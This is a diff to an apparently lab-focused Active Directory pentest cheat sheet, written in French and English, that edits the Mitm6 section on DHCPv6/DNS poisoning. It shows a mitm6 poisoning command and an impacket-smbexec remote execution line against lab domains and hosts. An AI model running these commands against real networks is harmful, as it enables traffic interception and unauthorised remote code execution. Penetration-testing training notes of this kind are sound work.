@@ -63,7 +63,9 @@ proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -de
 
 ## Mitm6
 
-Empoisonne les requêtes DNSv6 sur le réseau pour rediriger les clients vers un serveur WPAD contrôlé.
+If IPv6 is not disabled on user machines, it is possible to abuse requests (DHCPv6) to set up a corrupt DNS (our machine) as a name resolution server to resolve IPv6 names to get into a MiTM position.
+
+Empoisonne les requêtes DHCPv6 sur le réseau pour se mettre en position de DNS.
 
 ```bash
 mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
